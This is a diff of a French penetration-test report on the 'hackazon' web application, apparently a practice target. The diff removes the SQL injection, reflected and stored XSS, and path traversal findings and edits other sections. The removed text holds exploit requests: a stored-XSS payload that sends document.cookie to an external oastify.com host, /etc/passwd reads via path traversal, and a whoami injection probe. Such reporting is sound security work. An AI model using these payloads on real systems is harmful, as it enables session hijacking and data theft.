@@ -1245,210 +1245,8 @@ email=toto@tata.fr
 \end{tabular}
 \end{table}
 
-##### Injection SQL
 
-L'audit a révélé la présence d'une vulnérabilité d'injection SQL au niveau de l'application, ce qui permet à un attaquant d'exécuter des requêtes SQL arbitraires sur la base de données. Cette faille pourrait être exploitée pour extraire, modifier ou supprimer des données sensibles, compromettant ainsi l'intégrité et la confidentialité des informations stockées.
 
-\begin{table}[htbp]
-\centering
-\renewcommand{\arraystretch}{1.5} % Augmente l'espacement entre les lignes
-\begin{tabular}{|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{3cm}|}
-\hline
-\multicolumn{4}{|>{\columncolor{red}\centering\arraybackslash}p{16.30cm}|}{\textcolor{white}{\textbf{VULN-SQL-INJECTION : Exécution de requêtes SQL arbitraires via injection}}} \\ \hline
-\rowcolor{gray!30}
-\textbf{\textcolor{black}{État}} & \textbf{Impact} & \textbf{Difficulté d'exploitation} & \textbf{Sévérité} \\ \hline
-\textbf{Avérée} & \textbf{Très élevé} & \textbf{Faible} & \textbf{4 / 4} \\
-\hline
-\end{tabular}
-\end{table}
-
-Les tests effectués avec l'outil sqlmap ont permis de confirmer la vulnérabilité d'injection SQL sur l'URL suivante :
-```
-https://hackazon.trackflaw.com/category/view?id=19
-```
-
-![Sqlmap sortie de commande.](images/sqlmap.png)
-
-Comme illustré dans la capture d'écran ci-dessous, différents types d'injections (boolean-based blind, stacked queries, time-based blind, et UNION query) ont été exploités avec succès pour interagir directement avec la base de données. Les résultats montrent que l'application est vulnérable aux attaques via le paramètre id en raison d'une absence de validation ou de filtrage adéquat des entrées utilisateurs.
-
-*Remediation*
-
-\begin{table}[htbp]
-\centering
-\renewcommand{\arraystretch}{1.5} % Augmente l'espacement entre les lignes
-\begin{tabular}{|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|}
-\hline
-\multicolumn{3}{|>{\columncolor{cyan}\centering\arraybackslash}p{16.30cm}|}{\textcolor{white}{\textbf{VULN-SQL-INJECTION : Mettre en place des mécanismes de validation et d'assainissement des entrées}}} \\ \hline
-\textbf{Complexité estimée : Modéré} & \textbf{Travail/coût estimé : Faible} & \textbf{Priorité estimée : 4 / 4} \\
-\hline
-\multicolumn{3}{|p{16.30cm}|}{
-    Il est crucial de mettre en œuvre des mécanismes de validation rigoureux pour toutes les entrées utilisateur afin de prévenir les injections SQL. L'utilisation de requêtes préparées (requêtes paramétrées) avec des bind variables est fortement recommandée, car elles empêchent les chaînes de caractères injectées par un attaquant d'être interprétées comme du code SQL. De plus, il est conseillé de filtrer et d'assainir toutes les données d'entrée pour éliminer les caractères ou les chaînes potentiellement dangereux. Une approche basée sur le principe du "deny by default" doit être adoptée pour refuser toute entrée suspecte. Enfin, il est recommandé de surveiller les requêtes SQL via un système de détection des intrusions (IDS) ou de gestion des événements et informations de sécurité (SIEM) pour détecter toute tentative d'exploitation potentielle.
-} \\
-\hline
-\end{tabular}
-\end{table}
-
-##### Injection Reflected XSS
-
-Une vulnérabilité de type Cross-Site Scripting (XSS) a été détectée dans l'application. Cette faille permet à un attaquant d'injecter du code JavaScript malveillant qui s'exécute dans le navigateur de la victime. Le XSS réflectif se produit lorsque les données envoyées par l'utilisateur sont renvoyées directement au navigateur sans filtrage ou validation adéquate, ce qui peut entraîner des attaques telles que le vol de cookies, l'exécution de scripts malveillants ou la redirection vers des sites de phishing.
-
-\begin{table}[htbp]
-\centering
-\renewcommand{\arraystretch}{1.5} % Augmente l'espacement entre les lignes
-\begin{tabular}{|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{3cm}|}
-\hline
-\multicolumn{4}{|>{\columncolor{red}\centering\arraybackslash}p{16.30cm}|}{\textcolor{white}{\textbf{VULN-XSS-REFLECTED : Exécution de code JavaScript via injection de XSS réflechit}}} \\ \hline
-\rowcolor{gray!30}
-\textbf{\textcolor{black}{État}} & \textbf{Impact} & \textbf{Difficulté d'exploitation} & \textbf{Sévérité} \\ \hline
-\textbf{Avérée} & \textbf{Modéré} & \textbf{Facile} & \textbf{3 / 4} \\
-\hline
-\end{tabular}
-\end{table}
-
-Lors de l'audit, une injection de XSS réflectif a été découverte dans le paramètre searchString de la fonctionnalitée search. La requete vulnérable est la suivante:
-```
-GET /search?id=&searchString=<script>alert(1)</script> HTTP/2
-Host: hackazon.trackflaw.com
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: https://hackazon.trackflaw.com/index.php
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-X-Pwnfox-Color: red
-Priority: u=0, i
-Te: trailers
-```
-
-Comme illustré dans la capture d'écran ci-dessous, le script injecté par le testeur a été exécuté directement dans le navigateur, confirmant la vulnérabilité. Ce type d'attaque permettrait à un attaquant de manipuler le contenu de la page ou de voler des informations sensibles comme le cookie de session utilisateur.
-
-![alert stored xss.](images/reflected_xss.png)
-
-*Remediation*
-
-\begin{table}[htbp]
-\centering
-\renewcommand{\arraystretch}{1.5} % Augmente l'espacement entre les lignes
-\begin{tabular}{|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|}
-\hline
-\multicolumn{3}{|>{\columncolor{cyan}\centering\arraybackslash}p{16.30cm}|}{\textcolor{white}{\textbf{VULN-XSS-REFLECTED : Mettre en place une validation et une échappement des entrées utilisateurs}}} \\ \hline
-\textbf{Complexité estimée : Modéré} & \textbf{Travail/coût estimé : Faible} & \textbf{Priorité estimée : 3 / 4} \\
-\hline
-\multicolumn{3}{|p{16.30cm}|}{
-    Il est conseillé d'assainir et d'échapper systématiquement toutes les entrées utilisateur avant de les renvoyer au navigateur. Les caractères spéciaux utilisés en JavaScript, HTML et CSS doivent être correctement échappés pour éviter l'exécution de scripts injectés. En outre, l'application devrait utiliser des entêtes de sécurité appropriés tels que Content-Security-Policy (CSP) pour restreindre l'exécution de scripts non autorisés. Il est également recommandé de valider côté serveur toutes les données d'entrée pour détecter et bloquer toute tentative d'injection malveillante.
-} \\
-\hline
-\end{tabular}
-\end{table}
-
-##### Injection Stored XSS
-
-Une vulnérabilité de type Cross-Site Scripting (XSS) stockée a été détectée dans l'application. Contrairement au XSS réflectif, où l'attaque est immédiate et temporaire, le XSS stocké permet à un attaquant de faire persister un script malveillant sur le serveur. Ainsi, chaque utilisateur accédant à la page vulnérable se verra exécuter ce script, ce qui rend l'attaque plus dangereuse et difficile à détecter.
-
-\begin{table}[htbp]
-\centering
-\renewcommand{\arraystretch}{1.5} % Augmente l'espacement entre les lignes
-\begin{tabular}{|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{3cm}|}
-\hline
-\multicolumn{4}{|>{\columncolor{red}\centering\arraybackslash}p{16.30cm}|}{\textcolor{white}{\textbf{
-VULN-XSS-STORED : Exécution de code JavaScript via injection de XSS stocké}}} \\ \hline
-\rowcolor{gray!30}
-\textbf{\textcolor{black}{État}} & \textbf{Impact} & \textbf{Difficulté d'exploitation} & \textbf{Sévérité} \\ \hline
-\textbf{Avérée} & \textbf{Élevé	} & \textbf{Facile} & \textbf{4 / 4} \\
-\hline
-\end{tabular}
-\end{table}
-
-Lors de l'audit, une injection de XSS stockée a été découverte dans la section FAQ de l'application, où les utilisateurs peuvent soumettre des questions. La requête POST suivante a été utilisée pour injecter un script JavaScript malveillant via le paramètre userQuestion :
-```
-POST /faq HTTP/2
-Host: hackazon.trackflaw.com
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Content-Length: 258
-
-userEmail=toto%40tata.fr&userQuestion=<PAYLOAD>&_csrf_faq=AcHrpTTu6c3dmKzt5gFPDZ48YvRAoV37
-```
-
-Le code injecté a été stocké sur le serveur et a été exécuté chaque fois qu'un utilisateur accédait à la page FAQ, comme illustré dans la capture d'écran ci-dessous.
-
-![alert stored xss.](images/faq.png)
-
-Exemple d'attaque : En utilisant une charge utile telle que ```<script> fetch('https://cfvont1lcy9qkyinwrvp2mxc43auymmb.oastify.com/', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>```, le script est injecté et stocké sur la page, se déclenchant chaque fois que quelqu'un accède à la section FAQ. Combiné à la vulnérabilité des faibles paramètres du cookie de session utilisateur, cette charge utile permet d'extraire le cookie de session et de l'envoyer vers un serveur potentiellement malveillant. Ce cas d'usage entraîne ainsi une usurpation d'identité, permettant à un attaquant d'utiliser la session de l'utilisateur ciblé.
-
-*Remediation*
-
-\begin{table}[htbp]
-\centering
-\renewcommand{\arraystretch}{1.5} % Augmente l'espacement entre les lignes
-\begin{tabular}{|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|}
-\hline
-\multicolumn{3}{|>{\columncolor{cyan}\centering\arraybackslash}p{16.30cm}|}{\textcolor{white}{\textbf{VULN-XSS-STORED : Assainir et filtrer toutes les entrées utilisateur}}} \\ \hline
-\textbf{Complexité estimée : Modéré} & \textbf{Travail/coût estimé : Modéré} & \textbf{Priorité estimée : 4 / 4} \\
-\hline
-\multicolumn{3}{|p{16.30cm}|}{
-     Il est fortement recommandé de mettre en place des mesures d'assainissement et de validation côté serveur pour toutes les entrées utilisateur. Les balises HTML doivent être correctement échappées afin d'empêcher l'exécution de tout script. De plus, il est conseillé d'utiliser un mécanisme de liste blanche pour les entrées utilisateur et de désactiver toute exécution de code potentiellement malveillant. Enfin, l'utilisation de headers de sécurité tels que Content-Security-Policy (CSP) peut aider à atténuer le risque d'exécution de scripts injectés en bloquant les sources non approuvées de contenu scripté. Il est aussi essentiel de renforcer la sécurité des cookies de session en les marquant comme HttpOnly, Secure et en implémentant une politique de renouvellement régulier pour limiter la durée de vie d'une session volée.
-} \\
-\hline
-\end{tabular}
-\end{table}
-
-##### Obtentiel arbitraire d'un fichier non-authorisé 
-Une vulnérabilité de traversée de chemin a été identifiée sur l'application, permettant à un attaquant d'accéder à des fichiers système sensibles en manipulant les paramètres de la requête. Cette faille peut être exploitée pour lire des fichiers arbitraires du système d'exploitation sur lequel l'application est hébergée, exposant ainsi des informations critiques qui ne devraient pas être accessibles aux utilisateurs.
-
-\begin{table}[htbp]
-\centering
-\renewcommand{\arraystretch}{1.5} % Augmente l'espacement entre les lignes
-\begin{tabular}{|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{4cm}|>{\centering\arraybackslash}p{3cm}|}
-\hline
-\multicolumn{4}{|>{\columncolor{red}\centering\arraybackslash}p{16.30cm}|}{\textcolor{white}{\textbf{VULN-PATH-TRAVERSAL : Traversée de chemin non sécurisée}}} \\ \hline
-\rowcolor{gray!30}
-\textbf{\textcolor{black}{État}} & \textbf{Impact} & \textbf{Difficulté d'exploitation} & \textbf{Sévérité} \\ \hline
-\textbf{Avérée} & \textbf{Élevé} & \textbf{Facile} & \textbf{3 / 4} \\
-\hline
-\end{tabular}
-\end{table}
-
-La requête suivante illustre cette vulnérabilité :
-```
-GET /account/help_articles?page=/etc/passwd%0A HTTP/2
-Host: hackazon.trackflaw.com
-Cookie: visited_products=%2C64%2C72%2C1%2C81%2C; PHPSESSID=XXXXXXXXXXXXXXXXXXX
-```
-
-Ici, le paramètre page de la requête a été manipulé pour inclure le chemin du fichier /etc/passwd. La traversée de chemin est facilitée par l'utilisation du caractère %0A, qui représente un saut de ligne (newline). Ce caractère est essentiel pour que l'attaque fonctionne, probablement à cause de la manière dont le paramètre est interprété par le système ou l'application.
-
-**Exploitation et tests :**En testant différentes valeurs pour le paramètre page, il a été découvert que l'ajout du caractère %0A permettait de contourner certains mécanismes de sécurité ou de formatage de l'application, rendant possible l'accès au fichier système. Une fois la requête envoyée, le contenu du fichier /etc/passwd a pu être consulté, exposant des informations critiques sur les utilisateurs du système.
-
-![Path trasversal](images/passwd.png)
-
-Dans cet exemple, la requête permet de lire le fichier système /etc/passwd, qui contient des informations sur les utilisateurs du système, telles que les noms d'utilisateur et les répertoires personnels. Bien que les mots de passe soient généralement hachés ou stockés dans un autre fichier, ces informations peuvent toujours être utiles pour d'autres attaques (par exemple, reconnaissance, exploitation ultérieure).
-
-Des tests ont été effectués pour déterminer si l'application était également vulnérable à une injection de commande en essayant de manipuler la requête comme suit :
-```
-GET /account/help_articles?page=/etc/passwd%0Awhoami
-```
-Cependant, il a été observé que seule la lecture de fichiers arbitraires était possible, ce qui confirme qu'il s'agit d'une vulnérabilité de path traversal et non d'une injection de commande.
-
-*Remediation*
-
-\begin{table}[htbp]
-\centering
-\renewcommand{\arraystretch}{1.5} % Augmente l'espacement entre les lignes
-\begin{tabular}{|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|}
-\hline
-\multicolumn{3}{|>{\columncolor{cyan}\centering\arraybackslash}p{16.30cm}|}{\textcolor{white}{\textbf{VULN-PATH-TRAVERSAL : Valider et restreindre les chemins accessibles}}} \\ \hline
-\textbf{Complexité estimée : Modéré} & \textbf{Travail/coût estimé : Modéré} & \textbf{Priorité estimée : 4 / 4} \\
-\hline
-\multicolumn{3}{|p{16.30cm}|}{
-    Pour corriger cette vulnérabilité, il est essentiel de valider rigoureusement toutes les entrées utilisateur utilisées pour accéder à des fichiers. Le paramètre page ne doit permettre que l'accès à des fichiers spécifiques prédéfinis par l'application (par exemple, via une liste blanche). Les entrées doivent être nettoyées pour empêcher l'inclusion de caractères spéciaux comme %0A ou les séquences ../, qui permettent la navigation en dehors des répertoires autorisés. En sécurisant l'accès aux fichiers, la plateforme renforcera sa posture de sécurité et assurera la confiance continue de ses utilisateurs, évitant ainsi les répercussions négatives sur son chiffre d'affaires et sa réputation.
-} \\
-\hline
-\end{tabular}
-\end{table}
 
 ##### Open Redirect
 
@@ -1488,17 +1286,24 @@ Dans ce scénario, après la connexion, l'utilisateur serait automatiquement dir
 \begin{table}[htbp]
 \centering
 \renewcommand{\arraystretch}{1.5} % Augmente l'espacement entre les lignes
-\begin{tabular}{|>{\centering\arraybackslash}p{4.5cm}|>{\centering\arraybackslash}p{4.5cm}|>{\centering\arraybackslash}p{4.5cm}|}
+\begin{tabular}{|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|>{\centering\arraybackslash}p{5cm}|}
 \hline
-\multicolumn{3}{|>{\columncolor{cyan}\centering\arraybackslash}p{\textwidth}|}{\textcolor{white}{\textbf{VULN-OPEN-REDIRECT : Valider et restreindre les URL de redirection}}} \\ \hline
+\multicolumn{3}{|>{\columncolor{cyan}\centering\arraybackslash}p{16.30cm}|}{\textcolor{white}{\textbf{VULN-OPEN-REDIRECT : Valider et restreindre les URL de redirection}}} \\ \hline
 \textbf{Complexité estimée : Modéré} & \textbf{Travail/coût estimé : Faible} & \textbf{Priorité estimée : 4 / 4} \\
 \hline
-\multicolumn{3}{|p{\textwidth}|}{
-    Il est crucial de valider et de restreindre les valeurs du paramètre \texttt{return\_url} pour empêcher les redirections vers des domaines non autorisés. Les valeurs de ce paramètre doivent être comparées à une liste blanche d'URLs approuvées, et toute tentative de redirection vers un domaine externe doit être bloquée. Une autre solution consiste à utiliser des identifiants internes (par exemple, des codes ou des noms de pages) pour les redirections après connexion, plutôt que de permettre des URL complètes. Cela minimiserait les risques de manipulation externe. L'implémentation d'une fonctionnalité de journalisation pour enregistrer les tentatives de redirections non autorisées pourrait aussi faciliter la détection de tentatives d'abus. En corrigeant cette vulnérabilité, la plateforme renforcera non seulement sa sécurité, mais également sa réputation, assurant ainsi une meilleure fidélisation des clients et la protection du chiffre d'affaires.
+\multicolumn{3}{|p{16.30cm}|}{
+    Il est crucial de valider et de restreindre les valeurs du paramètre return_url pour empêcher les redirections vers des domaines non autorisés. Les valeurs de ce paramètre doivent être comparées à une liste blanche d'URLs approuvées, et toute tentative de redirection vers un domaine externe doit être bloquée. Une autre solution consiste à utiliser des identifiants internes (par exemple, des codes ou des noms de pages) pour les redirections après connexion, plutôt que de permettre des URL complètes. Cela minimiserait les risques de manipulation externe. L'implémentation d'une fonctionnalité de journalisation pour enregistrer les tentatives de redirections non autorisées pourrait aussi faciliter la détection de tentatives d'abus. En corrigeant cette vulnérabilité, la plateforme renforcera non seulement sa sécurité, mais également sa réputation, assurant ainsi une meilleure fidélisation des clients et la protection du chiffre d'affaires.
 } \\
 \hline
 \end{tabular}
 \end{table}
+
+
+
+
+
+
+
 
 
 #### Processus métier
@@ -1671,9 +1476,7 @@ En téléversant ce fichier PHP malveillant, un attaquant pourrait ensuite navig
 
 #### Gestion des erreurs
 
-La gestion des erreurs HTTP a été vérifiée, et le comportement de la page répond correctement aux différents tests effectués. L'URL d'erreur n'est pas affichée sur la page, garantissant ainsi une meilleure sécurité et une expérience utilisateur plus fluide.
-
-![Gestion erreur 404](images/404.png)
+> FIXME: Review of how the application handles errors (e.g., verbose error messages).
 
 #### Cryptographie
 
